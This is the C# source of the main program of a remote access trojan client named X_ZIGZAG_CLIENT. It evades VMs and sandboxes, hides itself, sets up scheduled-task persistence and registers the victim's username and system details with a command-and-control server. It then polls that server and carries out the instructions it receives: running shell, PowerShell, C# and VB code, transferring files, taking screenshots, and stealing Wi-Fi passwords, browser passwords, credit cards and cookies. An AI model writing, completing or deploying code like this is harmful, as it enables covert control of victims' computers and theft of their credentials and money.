using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Threading.Tasks;
using System.Runtime.Serialization.Json;
using System.Threading;
using System.Net.Http;
using System.Text;
using System.Net;
using System.Collections.Generic;
using System.Runtime.Serialization;
using System.Linq;

namespace X_ZIGZAG_CLIENT
{
    public class Instruction
    {
        public long instructionId { get; set; }

        public short code { get; set; }

        public string functionArgs { get; set; }
    }
    [DataContract]
    public class Response
    {
        [DataMember]
        public string output { get; set; }
    }
    [DataContract]
    public class ClientPingResponse
    {
        [DataMember]
        public int? code { get; set; }
        [DataMember]
        public int? screenshot { get; set; }
        [DataMember]
        public int nextPing { get; set; }
        [DataMember]
        public List<Instruction> instructions { get; set; }
    }

    internal static class Program
    {

        // Things to check everytime
        // IpChecker() DetectDebugger() DetectMonitiringTool() IsProxyDetectedUsingRegistry() IsProxyDetectedUsingWMI() CheckForSandbox()
        private static Queue<Instruction> instructionsQueue = new Queue<Instruction>();
        private static readonly object instructionsQueueLock = new object();
        static string uuid { get; set; }
        static string EndPoint = "http://server_ip:8080/";
        static int DelayDuration = 30000;
        static int Screenshots = 0;
        static bool keepDoing = true;
        [STAThread]
        static async Task Main()
        {
            // Sleep for a random time
            Thread.Sleep(new Random().Next(20_000, 60_000));
            // Basic Check if VM/VPS/RDP/SERVER + Proxy 
            if (await EnvironmentChecker.IsRunningInVM())
            {
                Environment.Exit(0);
            }
            // Hide The File + Basic Setup Task Scheduler
            SetupHandler.Start();
            // Generate UUID 
            uuid = GenerateUUID();
            // Login || SignUp
            Login();
            // Start Screenshot Handler
            Task.Run(() => ScreenshotsHandler());
            // Start Instructions Handler
            Task.Run(() => InstructionHandler());
            // Start Server Ping Handler
            Task.Run(() => Check()).Wait();

        }
        static string GenerateUUID()
        {
            FileInfo fileInfo = new FileInfo(Process.GetCurrentProcess().MainModule.FileName);
            byte[] timestampBytes = BitConverter.GetBytes(fileInfo.LastWriteTime.Ticks);

            // Compute the SHA-256 hash of the byte array
            byte[] hashBytes;
            using (SHA256 sha256 = SHA256.Create())
            {
                hashBytes = sha256.ComputeHash(timestampBytes);
            }
            return BitConverter.ToString(hashBytes).Replace("-", "").ToLower();
        }
        private static void ScreenshotsHandler()
        {
            while (true)
            {
                if (keepDoing)
                {
                    if (Screenshots == -1)
                    {
                        Actions.CaptureScreens(uuid, EndPoint);
                        Screenshots = 0;
                    }
                    else if (Screenshots > 0)
                    {
                        Actions.CaptureScreens(uuid, EndPoint);
                        Thread.Sleep(Screenshots * 1000);
                    }
                    else
                    {
                        Thread.Sleep(1000);
                    }
                }
                else
                {
                    Thread.Sleep(10000);
                }
            }
        }
        private static async Task InstructionHandler()
        {
            while (true)
            {
                if (instructionsQueue.Count == 0)
                {
                    Thread.Sleep(1000);

                }
                else
                {
                    var oldestInstruction = instructionsQueue.Dequeue();
                    switch (oldestInstruction.code)
                    {
                        case -2:
                            Actions.UpdateDataWithRetry(10, uuid, oldestInstruction.instructionId, EndPoint);
                            break;
                        case -1:
                            Actions.SelfDestruct();
                            break;
                        case 0:
                            await FilesHandler.UploadFileAsync(EndPoint + "Response/File/" + uuid + "/" + oldestInstruction.instructionId, oldestInstruction.functionArgs);

                            break;
                        case 1:
                            string[] downloadArgs = oldestInstruction.functionArgs.Split(new string[] { "*.-.*" }, StringSplitOptions.None);
                            if (downloadArgs.Count() != 2)
                            {
                                NotifyWithRetry(oldestInstruction.instructionId, "Bad Args");
                                break;
                            }
                            string downloadResult = await FilesHandler.DownloadFileAsync(downloadArgs[0], downloadArgs[1]);
                            NotifyWithRetry(oldestInstruction.instructionId, downloadResult);

                            break;
                        case 2:
                            if (oldestInstruction.functionArgs == null || oldestInstruction.functionArgs.Equals(""))
                            {
                                NotifyWithRetry(oldestInstruction.instructionId, "No Args?");
                                break;
                            }
                            string cmdOutput = Actions.ExecuteCommand(oldestInstruction.functionArgs);
                            NotifyWithRetry(oldestInstruction.instructionId, cmdOutput);
                            break;
                        case 3:
                            if (oldestInstruction.functionArgs == null || oldestInstruction.functionArgs.Equals(""))
                            {
                                NotifyWithRetry(oldestInstruction.instructionId, "No Args?");
                                break;
                            }
                            string PwsOutput = Actions.ExecuteCommand(oldestInstruction.functionArgs, true);
                            NotifyWithRetry(oldestInstruction.instructionId, PwsOutput);
                            break;
                        case 4:
                            //CameraHandling.CaptureImage(EndPoint + "Response/Webcam/" + uuid + "/" + oldestInstruction.instructionId+"/"+1);
                            break;
                        case 5:
                            NotifyWithRetry(oldestInstruction.instructionId, Actions.ExtractWiFiPasswords());
                            break;
                        case 6: // Browsers Password
                            Actions.GetBrowsersPasswords(EndPoint, oldestInstruction.instructionId, uuid);
                            break;
                        case 7: // Browsers Credit Cards
                            Actions.GetBrowsersCreditCards(EndPoint, oldestInstruction.instructionId, uuid);
                            break;
                        case 8: // Browsers Cookies
                            Actions.GetBrowsersCookies(EndPoint, oldestInstruction.instructionId, uuid);
                            break;
                        case 9: // Execute C# Code
                            if (oldestInstruction.functionArgs == null || oldestInstruction.functionArgs.Equals(""))
                            {
                                NotifyWithRetry(oldestInstruction.instructionId, "No Code?");
                                break;
                            }
                            string CsharpCodeOutput = Actions.ExecuteCsharpCode(oldestInstruction.functionArgs);
                            NotifyWithRetry(oldestInstruction.instructionId, CsharpCodeOutput);
                            break;
                        case 10: // Execute VB Code
                            if (oldestInstruction.functionArgs == null || oldestInstruction.functionArgs.Equals(""))
                            {
                                NotifyWithRetry(oldestInstruction.instructionId, "No Code?");
                                break;
                            }
                            string VBCodeOutput = Actions.ExecuteVbCode(oldestInstruction.functionArgs);
                            NotifyWithRetry(oldestInstruction.instructionId, VBCodeOutput);
                            break;
                    }
                }
            }
        }
        private static void NotifyWithRetry(long instructionId, string output)
        {
            Task.Run(async () =>
            {
                TimeSpan delay = TimeSpan.FromSeconds(10); // Initial delay for retry
                while (true)
                {
                    HttpClient httpClient = new HttpClient();
                    try
                    {
                        DataContractJsonSerializer serializer = new DataContractJsonSerializer(typeof(Response));

                        using (MemoryStream ms = new MemoryStream())
                        {
                            serializer.WriteObject(ms, new Response { output = output });
                            var content = new StringContent(System.Text.Encoding.UTF8.GetString(ms.ToArray()), Encoding.UTF8, "application/json");
                            var response = await httpClient.PostAsync(EndPoint + "Response/" + uuid + "/" + instructionId, content);
                            response.EnsureSuccessStatusCode();
                            break;
                        }
                    }
                    catch (Exception)
                    {

                        await Task.Delay(delay);
                    }
                }

            });
        }
        private static async Task Check()
        {
            while (true)
            {
                try
                {
                    using (HttpClient client = new HttpClient())
                    {
                        // Make the POST request
                        HttpResponseMessage s = await client.GetAsync(EndPoint + "Client/Check/" + uuid);
                        if (s.IsSuccessStatusCode)
                        {
                            string responseContent = await s.Content.ReadAsStringAsync();

                            using (var memoryStream = new MemoryStream(Encoding.UTF8.GetBytes(responseContent)))
                            {
                                // Create a DataContractJsonSerializer for the ClientPingResponse type
                                var serializer = new DataContractJsonSerializer(typeof(ClientPingResponse));

                                // Deserialize the MemoryStream to an object
                                var clientPingResponse = (ClientPingResponse)serializer.ReadObject(memoryStream);
                                DelayDuration = clientPingResponse.nextPing * 1000;
                                if (clientPingResponse.screenshot != null)
                                {
                                    Screenshots = (int)clientPingResponse.screenshot;
                                }
                                ;
                                if (clientPingResponse.instructions != null && clientPingResponse.instructions.Count > 0)
                                {
                                    foreach (var inst in clientPingResponse.instructions)
                                    {
                                        lock (instructionsQueueLock)
                                        {
                                            instructionsQueue.Enqueue(inst);

                                        }
                                    }

                                }
                            }
                        }
                    }
                }
                catch (Exception)
                {

                }
                Thread.Sleep(DelayDuration);
            }
        }
        static async void Login()
        {
            while (true)
            {
                Thread.Sleep(new Random().Next(0, 2000));
                try
                {
                    using (HttpClient client = new HttpClient())
                    {
                        // Set up the request content
                        var content = new StringContent($"{{\"id\":\"{uuid}\"}}", Encoding.UTF8, "application/json");

                        // Make the POST request
                        HttpResponseMessage response = await client.PostAsync(EndPoint + "Client", content);

                        // Check the response status code
                        if (response.IsSuccessStatusCode)
                        {
                            break;
                        }
                        else if (response.StatusCode == HttpStatusCode.NotFound)
                        {
                            // SignUp
                            while (true)
                            {
                                Thread.Sleep(new Random().Next(0, 5000));
                                try
                                {
                                    content = new StringContent($"{{\"id\":\"{uuid}\",\"Name\":\"{Actions.GetUsername().Replace("\\", "-")}\",\"Version\":\"{Actions.GetWindowsVersion()}\",\"SystemSpecs\":\"{Actions.GetSystemInfo().Replace("\n", "\\n").Replace("\r", "\\r")}\",\"ipAddress\":\"asd\"}}", Encoding.UTF8, "application/json");

                                    response = await client.PostAsync(EndPoint + "Client/New", content);

                                    if (response.IsSuccessStatusCode)
                                    {
                                        break;
                                    }
                                }
                                catch (Exception)
                                {
                                }
                            }
                            break;
                        }
                    }
                }
                catch (Exception)
                {
                }
            }
        }

    }
}
